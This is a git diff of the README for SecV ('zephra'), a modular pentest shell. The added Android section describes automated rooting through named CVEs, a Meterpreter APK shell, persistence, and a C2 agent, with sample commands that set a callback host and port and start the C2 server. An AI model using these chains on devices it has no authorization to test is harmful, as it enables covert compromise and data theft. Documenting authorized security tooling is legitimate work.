@@ -12,16 +12,16 @@
  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
 ```
 
-### polyglot cybersecurity orchestration platform
+### zephra
 
-`Go` · `Python` · `Bash` · `PowerShell` · `Rust` · `C++` — one shell to run them all
+`Go` · `Python` · `Bash` · `Rust` · `C++` — one shell, any language
 
 ---
 
-[![Version](https://img.shields.io/badge/v2.4.0-release-0d1117?style=flat-square&labelColor=00d9ff&color=0d1117)](https://github.com/SecVulnHub/SecV)
+[![Version](https://img.shields.io/badge/v2.4.0-zephra-0d1117?style=flat-square&labelColor=00d9ff&color=0d1117)](https://github.com/SecVulnHub/SecV)
 [![License](https://img.shields.io/badge/MIT-license-0d1117?style=flat-square&labelColor=8b5cf6&color=0d1117)](LICENSE)
-[![Go](https://img.shields.io/badge/Go_1.18+-required-0d1117?style=flat-square&labelColor=00ADD8&color=0d1117)](https://golang.org/)
-[![Platform](https://img.shields.io/badge/Linux%20%7C%20macOS%20%7C%20Windows-0d1117?style=flat-square&labelColor=3a3f4b&color=0d1117)](#)
+[![Go](https://img.shields.io/badge/Go_1.21+-required-0d1117?style=flat-square&labelColor=00ADD8&color=0d1117)](https://golang.org/)
+[![Platform](https://img.shields.io/badge/Linux%20%7C%20macOS-0d1117?style=flat-square&labelColor=3a3f4b&color=0d1117)](#)
 
 </div>
 
@@ -29,30 +29,13 @@
 
 ## Overview
 
-SecV is a **native Go shell** that loads and orchestrates security modules written in any language. Think Metasploit's interface — but your modules can be Python, Bash, Go, PowerShell, Rust, or C++. The loader handles discovery, I/O marshaling, timeouts, validation, and output formatting. You write the logic.
-
-The v2.4.0 rewrite replaced the Python shell with a compiled Go binary. The result: **8ms startup, 12MB memory, 2.1MB binary.**
+SecV is a compiled Go shell that loads and runs security modules written in any language. The loader handles module discovery, JSON I/O, timeouts, dependency checking, and tab completion. You write the logic — in Python, Bash, Go, Rust, C++, whatever works.
 
 ```
-secV ➤ use portscan
-secV (portscan) ➤ set engine syn
-secV (portscan) ➤ set ports top-100
-secV (portscan) ➤ run target.com
+secV ❯ use netrecon
+secV (netrecon) ❯ set ports top-100
+secV (netrecon) ❯ run 192.168.1.0/24
 ```
-
----
-
-## Performance
-
-| Metric          | Python v2.3 | Go v2.4 | Delta     |
-|-----------------|-------------|---------|-----------|
-| Startup         | 800ms       | 8ms     | **100×**  |
-| Memory          | 45MB        | 12MB    | **−73%**  |
-| Module load     | 120ms       | 5ms     | **24×**   |
-| Command latency | 50ms        | 2ms     | **25×**   |
-| Binary size     | —           | 2.1MB   | portable  |
-
-No interpreter. No warm-up. No overhead.
 
 ---
 
@@ -64,16 +47,7 @@ cd SecV
 chmod +x install.sh && ./install.sh
 ```
 
-**Tiers:**
-
-| Tier         | Size    | Description                          |
-|--------------|---------|--------------------------------------|
-| `basic`      | ~5MB    | Core shell only                      |
-| `standard`   | ~50MB   | + Scanning stack *(recommended)*     |
-| `full`       | ~100MB  | All features                         |
-| `elite`      | ~100MB  | + Masscan for large-scale recon      |
-
-Then launch:
+The installer detects your distro (Arch, Debian, Fedora, Alpine) and installs missing tools using the right package manager. It compiles the Go binary and optionally installs it system-wide.
 
 ```bash
 ./secV          # from repo directory
@@ -87,46 +61,40 @@ secV            # if installed system-wide
 ```
 # Navigation
 show modules          list all available modules
-show categories       browse by category
-search <keyword>      fuzzy search modules
+search <keyword>      search by name or category
 use <module>          load a module
 back                  unload current module
 reload                rescan tools/ directory
-info <module>         show module metadata
+info <module>         module details + dependency status
 
 # Module interaction
-show options          list parameters and defaults
+show options          list parameters
 set <key> <value>     assign a parameter
 run <target>          execute against target
-help module           context-aware docs
+help module           module-specific help
 
 # System
-update                pull latest + recompile if needed
+update                pull latest from git + recompile
 clear                 clear terminal
 exit
 ```
+
+Tab completion is active for all commands and module names.
 
 ---
 
 ## Module Architecture
 
-SecV communicates with modules via **JSON over stdin/stdout**. The loader sends an execution context; your module reads it, does work, and prints a JSON result. That's the contract.
+SecV passes context to modules via **JSON on stdin** and reads results from stdout. There is no framework to import — just read stdin, do your work, write output.
 
 ```json
-// Input  (sent to your module's stdin)
+// stdin → your module
 {
   "target": "example.com",
   "params": {
     "ports": "top-100",
     "engine": "syn"
   }
-}
-
-// Output  (your module writes to stdout)
-{
-  "success": true,
-  "data": { ... },
-  "errors": []
 }
 ```
 
@@ -140,36 +108,9 @@ ctx    = json.loads(sys.stdin.read())
 target = ctx["target"]
 params = ctx.get("params", {})
 
-# --- your logic ---
+# your logic
 
 print(json.dumps({"success": True, "data": {"target": target}}))
-```
-
-### Go
-
-```go
-package main
-
-import (
-    "encoding/json"
-    "fmt"
-    "io"
-    "os"
-)
-
-func main() {
-    raw, _ := io.ReadAll(os.Stdin)
-    var ctx map[string]any
-    json.Unmarshal(raw, &ctx)
-
-    // --- your logic ---
-
-    out, _ := json.Marshal(map[string]any{
-        "success": true,
-        "data":    map[string]any{"target": ctx["target"]},
-    })
-    fmt.Println(string(out))
-}
 ```
 
 ### Bash
@@ -179,7 +120,7 @@ func main() {
 input=$(cat)
 target=$(echo "$input" | jq -r '.target')
 
-# --- your logic ---
+# your logic
 
 jq -n --arg t "$target" '{"success": true, "data": {"target": $t}}'
 ```
@@ -197,7 +138,7 @@ Every module needs a manifest alongside its executable:
   "author":      "you",
   "executable":  "python3 scanner.py",
 
-  "dependencies": ["python3"],
+  "dependencies": ["python3", "nmap"],
   "optional_dependencies": {
     "scapy": "SYN scan support — pip3 install scapy"
   },
@@ -212,63 +153,74 @@ Every module needs a manifest alongside its executable:
 }
 ```
 
-Drop your module into `tools/<category>/<name>/` and run `reload`. SecV auto-discovers it.
+List binary names in `dependencies` (e.g. `adb`, `nmap`) — SecV checks them with `which` and offers to install missing ones using your system's package manager.
 
-### Graceful degradation pattern
-
-```python
-try:
-    import scapy.all as scapy
-    HAS_SCAPY = True
-except ImportError:
-    HAS_SCAPY = False
-
-def scan(target):
-    if HAS_SCAPY:
-        return syn_scan(target)       # full capability
-    return connect_scan(target)       # stdlib fallback
-
-if not HAS_SCAPY:
-    print("INFO: install scapy for SYN mode", file=sys.stderr)
-```
-
-Modules that degrade gracefully work across all installation tiers without crashing.
+Drop your module into `tools/<category>/<name>/` and run `reload`.
 
 ---
 
 ## Built-in Modules
 
-### `portscan` — Elite Port Scanner v3.0
-**Category:** scanning
+### `netrecon` — Network Reconnaissance
 
-Four scan engines with intelligent fallback: TCP connect → SYN stealth → Nmap → Masscan. Includes service fingerprinting (50+ signatures), HTTP tech detection (30+ frameworks), OS fingerprinting, TLS/SSL inspection, CVE correlation, DNS enumeration, and adaptive timeout via 95th-percentile sampling. Up to 500 concurrent threads.
+Concurrent multi-engine network profiling. Runs nmap, masscan, rustscan, and arp-scan simultaneously, merges results, and correlates CVEs against detected services. Detects iOS/Apple devices via port 62078 (lockdownd) and mDNS.
 
 ```bash
-use portscan
-set engine auto      # tcp | syn | nmap | masscan | auto
-set ports web        # web | top-100 | top-1000 | all | custom range
-set threads 200
-run target.com
+use netrecon
+set mode network
+set ports top-100
+run 192.168.1.0/24
 ```
 
 ---
 
-### `android_pentest` — Android Security Suite v1.0
-**Category:** mobile | **Author:** 0xb0rn3
+### `android_pentest` — Android Security Testing
 
-Seven operation modes covering the OWASP Mobile Top 10.
+Full-lifecycle Android pentesting suite — from passive recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, and on-device native agent deployment.
 
-| Operation    | Description                                          |
-|--------------|------------------------------------------------------|
-| `recon`      | Device fingerprint, root status, SELinux             |
-| `app_scan`   | Static APK analysis, manifest audit, security score  |
-| `vuln_scan`  | 50+ vuln checks, OWASP Mobile Top 10                 |
-| `exploit`    | Intent injection, SQLi, path traversal               |
-| `network`    | Traffic capture, SSL inspection, proxy               |
-| `forensics`  | Data extraction, artifact analysis, timeline         |
-| `advanced`   | Frida hooks, SSL pinning bypass, secret search       |
+| Operation         | Description                                                      |
+|-------------------|------------------------------------------------------------------|
+| `recon`           | Device fingerprint, root status, SELinux, chipset                |
+| `app_scan`        | APK analysis, manifest audit, security score                     |
+| `vuln_scan`       | 50+ checks, OWASP Mobile Top 10, NVD live CVEs (incl. MediaTek) |
+| `exploit`         | Intent injection, SQLi, content provider attacks                 |
+| `network`         | Traffic capture, SSL inspection, proxy                           |
+| `forensics`       | Data extraction, artifact analysis                               |
+| `get_root`        | Multi-vector root acquisition (Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU) |
+| `inject_agent`    | Push native recon agent, receive JSON report via TCP C2, auto-escalate |
+| `adb_wifi`        | Enable ADB over WiFi — drop USB dependency                       |
+| `deploy_shell`    | Generate + install Meterpreter APK (no root, bypasses settings)  |
+| `persist`         | Termux:Boot + Magisk module persistence                          |
+| `exploit_cve`     | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, etc.) |
+| `full_pwn`        | Full automated chain: recon → root → shell → persist → WAN       |
+| `multi_device`    | Run any operation across ALL connected devices simultaneously    |
+| `full`            | Full recon + vuln_scan + exploit + network + forensics           |
+
+**On-device agent** (`tools/mobile/android/agent/`):
+- `secv_agent.sh` — shell script, works on any Android without compilation
+- `secv_agent.c` — compiled ARM64 binary (faster, NDK cross-compile via `build.sh`)
+- `c2_server.py` — standalone TCP+HTTP C2 server with interactive REPL
 
 ```bash
+# Basic recon via agent
+use android_pentest
+set operation inject_agent
+set agent_mode recon
+run device
+
+# Full exploitation chain with root shell callback
+use android_pentest
+set operation inject_agent
+set agent_mode exploit
+set escalate true
+set lhost 192.168.1.100
+set lport 4444
+run device
+
+# Run C2 server (separate terminal)
+python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1.100 --lport 4444
+
+# Static APK analysis
 use android_pentest
 set operation app_scan
 set package com.target.app
@@ -277,83 +229,80 @@ run device
 
 ---
 
-### `mac_spoof` — MAC Address Manipulation v2.0
-**Category:** network | **Author:** 0xb0rn3
+### `ios_pentest` — iOS Security Testing
 
-Per-interface background daemons, locally-administered address generation, state persistence, configurable rotation interval, dry-run mode.
+Connects via libimobiledevice. Checks security posture, installed apps, jailbreak indicators, entitlements, and ATS configuration. Runs live NVD keyword searches for iOS-version-specific CVEs. Covers non-jailbroken and jailbroken assessment paths.
+
+```bash
+use ios_pentest
+set operation recon
+run device
+```
+
+---
+
+### `mac_spoof` — MAC Address Rotation
+
+Per-interface background daemons with locally-administered address generation, configurable rotation interval, and state persistence.
 
 ```bash
 sudo secV
 use mac_spoof
 set iface wlan0
-set interval 300    # rotate every 5 min
+set interval 300
 run localhost
 ```
 
 ---
 
-## Module Index
+### `wifi_monitor` — Smart WiFi Monitor
 
-| Category       | Modules                                               |
-|----------------|-------------------------------------------------------|
-| scanning       | `portscan`, `nmap-wrapper`, `masscan-integration`     |
-| mobile         | `android_pentest`, `apk-analyzer`, `frida-hooks`      |
-| network        | `mac_spoof`, `arp-spoof`, `dns-spoof`                 |
-| web            | `web-enum`, `sql-injection`, `xss-scanner`            |
-| recon          | `subdomain-enum`, `shodan-search`, `theHarvester`     |
-| vulnerability  | `vuln-scan`, `cve-checker`, `nessus-wrapper`          |
-| exploitation   | `metasploit-bridge`, `exploit-db`                     |
-| wireless       | `wifi-crack`, `evil-twin`, `bluetooth-scan`           |
-| forensics      | `memory-dump`, `file-carving`, `timeline`             |
+Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, device fingerprinting (IoT, router, NAS, database server), CVE lookup via CIRCL API, and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.
+
+```bash
+sudo secV
+use wifi_monitor
+run 192.168.1.0/24
+```
 
 ---
 
-## Update System v4.1
+### `webscan` — Web Vulnerability Scanner
 
-SecV silently checks for updates every 24 hours. On startup, if a newer version exists:
-
-```
-┌─────────────────────────────────────────┐
-│  Update available — v2.4.1              │
-└─────────────────────────────────────────┘
-Update now? [Y/n]:
-
-[1/8] backup ............... ✓ 20250111_143052
-[2/8] local changes ........ ✓ none detected
-[3/8] git pull ............. ✓ fast-forward
-[4/8] obsolete files ....... ✓ removed 3
-[5/8] recompile ............ ✓ 2.1MB (main.go changed)
-[6/8] dependencies ......... ✓ no changes
-[7/8] version info ......... ✓ updated
-[8/8] cleanup .............. ✓
-
-Restart SecV to load new components.
-```
-
-Manual controls:
+OWASP Top 10 web scanner: error-based and time-based SQL injection (MySQL, PostgreSQL, MSSQL), reflected XSS, CSRF detection, 403 bypass (header injection + path tricks), open redirect, Jira/AEM/Confluence CVEs, security headers audit, and file upload detection. Supports authenticated scanning via cookies.
 
 ```bash
-secV ➤ update                      # interactive update
-
-python3 update.py                  # check and apply
-python3 update.py --status         # component status
-python3 update.py --verify         # integrity check
-python3 update.py --repair         # fix common issues
-python3 update.py --rollback       # restore last backup
-python3 update.py --list-backups   # show available backups
+use webscan
+set url https://example.com/search?q=test
+run https://example.com
 ```
-
-Keeps the last 5 timestamped backups. Recompiles the Go binary only when `main.go` changes. Installs Python deps only when `requirements.txt` changes. Smart-stashes local modifications before pulling; restores after.
 
 ---
 
-## Module Development Quickstart
+## `gen_module.py` — Module JSON Generator
+
+Auto-generates `module.json` by scanning your source for `params.get()`, `argparse`, and Bash `jq .params.X` patterns. Infers types, defaults, and required flags.
 
 ```bash
-# scaffold
+# Generate and print
+python3 gen_module.py tools/network/my-tool/
+
+# Write module.json into the tool directory
+python3 gen_module.py tools/network/my-tool/ --write
+
+# Merge newly detected params into an existing hand-written module.json
+python3 gen_module.py tools/network/my-tool/ --update
+```
+
+Fill in `help.parameters[*].description` and `help.examples` manually — the generator leaves those empty since they require human context.
+
+---
+
+## Module Development
+
+```bash
 mkdir -p tools/scanning/my-tool && cd tools/scanning/my-tool
 
-# create manifest
 cat > module.json << 'EOF'
 {
   "name": "my-tool",
@@ -370,38 +319,51 @@ cat > module.json << 'EOF'
 }
 EOF
 
-# create entrypoint
 cat > main.py << 'EOF'
 #!/usr/bin/env python3
 import json, sys
-
 ctx = json.loads(sys.stdin.read())
-
 # your logic here
-
 print(json.dumps({"success": True, "data": {"target": ctx["target"]}}))
 EOF
 
 chmod +x main.py
 ```
 
+Test:
+
 ```bash
-# test it
 cd ../../..
 ./secV
-secV ➤ reload
-secV ➤ use my-tool
-secV (my-tool) ➤ run example.com
+secV ❯ reload
+secV ❯ use my-tool
+secV (my-tool) ❯ run example.com
 ```
 
-**Checklist before submitting a PR:**
+**Before opening a PR:**
 
-- [ ] Works on Basic tier (stdlib only), degrades gracefully otherwise
-- [ ] `module.json` is valid JSON and includes all required fields
-- [ ] `README.md` inside module directory with usage examples
-- [ ] Handles all errors — never unhandled exceptions to stdout
-- [ ] Cross-platform (or explicitly documents platform requirement)
-- [ ] Follows language style: PEP 8 / `gofmt` / ShellCheck
+- [ ] Works without optional dependencies (graceful degradation)
+- [ ] `module.json` is valid JSON with all required fields
+- [ ] `README.md` inside the module directory
+- [ ] Handles errors — no unhandled exceptions to stdout
+- [ ] Lists binary names (not package names) in `dependencies`
+
+---
+
+## Update System
+
+SecV pulls from `https://github.com/secvulnhub/SecV.git`. On update it stashes local changes, pulls, recompiles the binary if `main.go` changed, and installs Python deps if `requirements.txt` changed.
+
+```bash
+secV ❯ update                      # interactive update
+
+python3 update.py                  # check and apply
+python3 update.py --status         # component status
+python3 update.py --verify         # integrity check
+python3 update.py --repair         # fix common issues
+python3 update.py --rollback       # restore last backup
+python3 update.py --sync-tools     # fix module script permissions
+```
 
 ---
 
@@ -409,98 +371,49 @@ secV (my-tool) ➤ run example.com
 
 **Module not found after adding**
 ```bash
-secV ➤ reload
+secV ❯ reload
 ```
 
-**Permission denied on startup**
+**Permission denied**
 ```bash
 chmod +x secV install.sh
 ```
 
 **Go binary won't compile**
 ```bash
-# install Go first
-sudo apt install golang-go    # Debian/Ubuntu
-sudo pacman -S go             # Arch
-brew install go               # macOS
+sudo pacman -S go          # Arch
+sudo apt install golang    # Debian/Ubuntu
+brew install go            # macOS
 
-go build -o secV main.go
+cd /path/to/SecV
+go mod tidy
+go build -o secV .
 ```
 
 **Update fails with merge conflict**
 ```bash
 git stash && git pull && git stash pop
-# or full rollback:
-python3 update.py --rollback
-```
-
-**Debug mode**
-```bash
-./secV --debug
-# or per-module:
-set verbose true
-```
-
----
-
-## Roadmap
-
-```
-v2.4.0  ██████████  current
-        Go loader, smart updates, android pentest, port scanner v3
-
-v2.5.0  ██░░░░░░░░  Q2 2025
-        Web dashboard, REST API, module marketplace,
-        cloud scanning (AWS/Azure/GCP), PostgreSQL backend,
-        advanced reporting engine
-
-v3.0.0  ░░░░░░░░░░  Q4 2025
-        Plugin SDK, workflow automation, ML integration,
-        threat intel feeds, multi-user + RBAC,
-        Docker/Kubernetes, mobile app
-```
-
----
-
-## Contributing
-
-```bash
-# fork, then:
-git clone https://github.com/YOUR_USERNAME/SecV.git
-cd SecV
-git checkout -b feature/module-name
-
-# build your module under tools/
-# test it with ./secV
-# add deps to requirements.txt with a comment linking to your module
-
-git commit -m "feat(modules): add <name> — <one-line description>"
-git push origin feature/module-name
-# open PR on GitHub
+python3 update.py --rollback   # or restore backup
 ```
 
 ---
 
 ## Legal
 
-SecV is for **authorized security testing only.** You must have explicit written permission before scanning, probing, or testing any system you do not own.
+SecV is for **authorized security testing only.** You must have explicit written permission before scanning or testing any system you do not own.
 
-Unauthorized use may violate computer fraud statutes (CFAA, Computer Misuse Act, and equivalents). The authors accept no liability for misuse. By using this tool you accept full responsibility for your actions.
-
-> When in doubt — don't. Get written authorization first.
+Unauthorized use may violate computer fraud statutes. The authors accept no liability for misuse.
 
 ---
 
 ## License
 
-MIT © 2024–2025 SecVulnHub Team
+MIT © 2024–2026 SecVulnHub
 
 ---
 
 <div align="center">
 
-**SecV** — *orchestrating security, one module at a time*
-
-built by ethical hackers · powered by Go · extended by everything else
+**SecV** · zephra · built by 0xb0rn3
 
 </div>
